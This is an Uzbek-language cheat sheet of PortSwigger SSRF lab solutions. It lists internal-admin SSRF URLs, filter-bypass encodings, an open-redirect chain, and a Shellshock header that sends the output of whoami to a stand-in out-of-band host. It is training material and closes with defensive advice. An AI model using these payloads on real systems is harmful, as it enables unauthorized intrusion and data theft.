# SSRF — PortSwigger LAB yechimlari (cheat sheet)

> Lab host = **example.com**, Collaborator = **COLLAB.example.net**.
> Nishon odatda stock checker: `POST /product/stock`, parametr `stockApi`.
> Maqsad: server'ni ichki tizimga so'rov yuborishga majburlab, `/admin` orqali carlos'ni o'chirish.

### Basic SSRF against localhost — APPRENTICE
```
stockApi=http://localhost/admin
stockApi=http://localhost/admin/delete?username=carlos
```

### Basic SSRF against back-end system — APPRENTICE
Ichki IP diapazonini skanerlaysan.
```
stockApi=http://192.168.0.1:8080/admin     ← oxirgi oktetni Intruder Numbers 1–255
→ 200 topilgan IP'da: http://192.168.0.X:8080/admin/delete?username=carlos
```

### Blacklist filter bypass — PRACTITIONER
`127.0.0.1` va `localhost` bloklangan → alternativ yozuv + double-encode.
```
stockApi=http://127.1/
stockApi=http://127.1/%2561dmin          ← %2561 = double-encoded 'a' (admin)
→ http://127.1/%2561dmin/delete?username=carlos
```
> Boshqa bypasslar: `http://2130706433/` (decimal), `http://0177.0.0.1/` (octal), `http://[::1]/`.

### Whitelist filter bypass — PRACTITIONER
Faqat `stock.weliketoshop.net` ruxsat → credentials (`@`) + fragment (`#`) + double-encode.
```
http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```
> `%2523` = double-encoded `#`. Filtr host'ni `stock...` deb o'qiydi, backend `localhost` ga boradi.

### Filter bypass via open redirection — PRACTITIONER
`stockApi` boshqa host'ga bormaydi → ilovaning open-redirect'iga (`nextProduct?path=`) yo'naltirasan.
```
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

---

## Blind SSRF

### OOB detection — PRACTITIONER
Javob ko'rinmaydi → `Referer` header'ga Collaborator payload.
```
Referer: http://COLLAB.example.net
→ Collaborator Poll now → DNS/HTTP interaction = blind SSRF tasdiq
```

### Shellshock exploitation — PRACTITIONER
Blind SSRF ichki serverga → Shellshock (CVE-2014-6271) bilan buyruq natijasini OOB chiqarasan.
```
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).COLLAB.example.net
Referer: http://192.168.0.1:8080       ← oxirgi oktet Intruder Numbers 1–255
→ Collaborator DNS interaction subdomenida OS username chiqadi
```

---

### Eslatma
IP bypass arsenali (README'da to'liq): `127.1`, decimal/octal/hex, `[::1]`, `@`, `#`, double-encode,
DNS rebinding, open-redirect chain. SSRF → cloud metadata (`169.254.169.254`) = Critical.
Himoya: allowlist + DNS resolution'dan keyin IP tekshirish + redirect follow'ni o'chirish.
Umumiy: bu papka README.
